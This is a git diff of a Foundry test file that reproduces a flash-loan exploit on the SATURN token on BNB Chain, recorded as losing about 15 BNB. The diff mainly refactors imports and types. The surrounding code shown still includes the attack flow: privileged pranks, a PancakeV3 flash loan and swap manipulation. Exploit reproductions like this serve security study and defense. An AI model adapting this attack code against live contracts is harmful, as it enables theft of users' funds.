@@ -2,7 +2,14 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "../interface.sol";
+
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
+import {IWBNB} from "src/interfaces/IWBNB.sol";
+
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
+
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 
 // @KeyInfo - Total Lost : ~15 BNB
 // Attacker : 0xc468D9A3a5557BfF457586438c130E3AFbeC2ff9
@@ -22,7 +29,7 @@ contract ContractTest is Test {
     address public attacker = address(this);
     address public SATURN_creater = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;
 
-    Uni_Pair_V3 pancakeV3Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
+    IUniswapV3Pair pancakeV3Pool = IUniswapV3Pair(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
     IPancakePair pair_WBNB_SATURN = IPancakePair(0x49BA6c20D3e95374fc1b19D537884b5595AA6124);
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 constant SATURN = IERC20(0x9BDF251435cBC6774c7796632e9C80B233055b93);
@@ -47,14 +54,14 @@ contract ContractTest is Test {
         approveAll();
         // init saturn token
         vm.prank(SATURN_creater);
-        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", false));
+        (bool sucess1,) = address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", false));
 
         uint256 attacker_amount = SATURN.balanceOf(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
         vm.prank(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
         SATURN.transfer(attacker, attacker_amount);
 
         vm.prank(SATURN_creater);
-        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", true));
+        (bool sucess2,) = address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", true));
 
         // start attack
         pancakeV3Pool.flash(attacker, 0, 3_300_000_000_000_000_000_000, bytes(""));
@@ -62,7 +69,7 @@ contract ContractTest is Test {
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
-        (uint256 limit) = abi.decode(result, (uint256));
+        uint256 limit = abi.decode(result, (uint256));
         uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
 
         address[] memory path = new address[](2);
@@ -87,5 +94,6 @@ contract ContractTest is Test {
     }
 
     fallback() external payable {}
+    receive() external payable {}
 
 }
